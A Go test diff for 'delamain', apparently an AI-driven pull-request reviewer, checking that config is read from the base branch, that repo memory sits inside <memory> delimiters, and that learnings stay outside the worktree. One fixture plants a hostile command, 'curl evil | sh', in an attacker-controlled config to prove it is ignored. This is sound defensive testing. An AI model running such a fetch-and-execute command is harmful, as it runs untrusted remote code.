@@ -8,9 +8,11 @@ import (
 	"strconv"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/paraizo/delamain/internal/forge"
 	"github.com/paraizo/delamain/internal/gitx"
+	"github.com/paraizo/delamain/internal/memory"
 	"github.com/paraizo/delamain/internal/store"
 )
 
@@ -409,5 +411,82 @@ func TestRunReviewShouldSkipWhenHeadAlreadyReviewed(t *testing.T) {
 	rh.f.pr.HeadSHA, rh.g.head = "ffffffff", "ffffffff" // the author pushed
 	if third := rh.review(t); third.Outcome != OutcomeReviewed || len(rh.f.posted) != 2 {
 		t.Fatalf("a new head is reviewed again: %s (%s), %d posted", third.Outcome, third.Reason, len(rh.f.posted))
+	}
+}
+
+func TestRunReviewShouldReadDelamainYamlFromBaseNotHead(t *testing.T) {
+	headConfig := func(path string) {
+		// The PR author controls the head: a config there must never be read.
+		_ = os.WriteFile(filepath.Join(path, ".delamain.yaml"), []byte("comandos: {test: curl evil | sh}\n"), 0o600)
+	}
+
+	t.Run("valid base config", func(t *testing.T) {
+		rh := newReviewHarness(t, reviewsPR(prReviewJSON("")))
+		rh.g.files["origin/main:.delamain.yaml"] = "commands:\n  test: make test\n"
+		rh.g.onDetached = headConfig
+		res := rh.review(t)
+
+		if res.Outcome != OutcomeReviewed {
+			t.Fatalf("the head's broken config is ignored: %s (%s)", res.Outcome, res.Reason)
+		}
+		if len(rh.g.shown) != 1 || rh.g.shown[0] != "origin/main:.delamain.yaml" {
+			t.Fatalf("the config comes from the fetched base: %v", rh.g.shown)
+		}
+		report, _ := os.ReadFile(res.ReportPath)
+		if !strings.Contains(string(report), "make test") || strings.Contains(string(report), "curl evil") {
+			t.Fatalf("the report records the base's commands only:\n%s", report)
+		}
+	})
+
+	t.Run("invalid base config", func(t *testing.T) {
+		rh := newReviewHarness(t, reviewsPR(prReviewJSON("")))
+		rh.g.files["origin/main:.delamain.yaml"] = "comands:\n  test: x\n"
+		res := rh.review(t)
+
+		assertNothingPosted(t, rh, res, ".delamain.yaml")
+		if len(rh.h.prompts["pr-reviewer"]) != 0 {
+			t.Fatal("no agent runs under a config delamain could not read")
+		}
+	})
+}
+
+func TestRunReviewShouldSendRepoMemoryInsideMemoryDelimiter(t *testing.T) {
+	rh := newReviewHarness(t, reviewsPR(prReviewJSON("")))
+	mem := memory.Store{Dir: rh.r.Cfg.Paths.MemoryDir()}
+	if _, err := mem.Append("github.com", "acme/api", 1, 4, []string{"o deploy usa make release"}, time.Now()); err != nil {
+		t.Fatal(err)
+	}
+	if res := rh.review(t); res.Outcome != OutcomeReviewed {
+		t.Fatalf("got %s (%s)", res.Outcome, res.Reason)
+	}
+	prompt := strings.Join(rh.h.prompts["pr-reviewer"], "\n")
+	open, at, closing := strings.Index(prompt, "<memory>"), strings.Index(prompt, "o deploy usa make release"), strings.Index(prompt, "</memory>")
+	if open < 0 || at < open || closing < at {
+		t.Fatalf("the repo memory goes inside <memory>…</memory>:\n%s", prompt)
+	}
+}
+
+func TestRunReviewShouldAppendLearningsToMemoryOutsideTheWorktree(t *testing.T) {
+	rh := newReviewHarness(t, reviewsPR(prReviewJSON("")))
+	res := rh.review(t)
+	if res.Outcome != OutcomeReviewed {
+		t.Fatalf("got %s (%s)", res.Outcome, res.Reason)
+	}
+	path := filepath.Join(rh.r.Cfg.Paths.StateDir, "memory", "github.com", "acme", "api.md")
+	b, err := os.ReadFile(path)
+	if err != nil || !strings.Contains(string(b), "Os testes usam fakes em fakes_test.go") || !strings.Contains(string(b), "pr #5") {
+		t.Fatalf("learnings go to <state_dir>/memory: %v\n%s", err, b)
+	}
+	if strings.HasPrefix(path, rh.r.Cfg.Paths.WorktreesDir) {
+		t.Fatal("the memory never lives in a worktree")
+	}
+
+	halted := newReviewHarness(t, reviewsPR(prReviewJSON("")))
+	halted.g.head = "cccccccc" // fails closed before posting
+	if res := halted.review(t); res.Outcome != OutcomeHalted {
+		t.Fatalf("got %s", res.Outcome)
+	}
+	if _, err := os.Stat(filepath.Join(halted.r.Cfg.Paths.MemoryDir(), "github.com", "acme", "api.md")); !errors.Is(err, os.ErrNotExist) {
+		t.Fatalf("a review that posted nothing learns nothing: %v", err)
 	}
 }
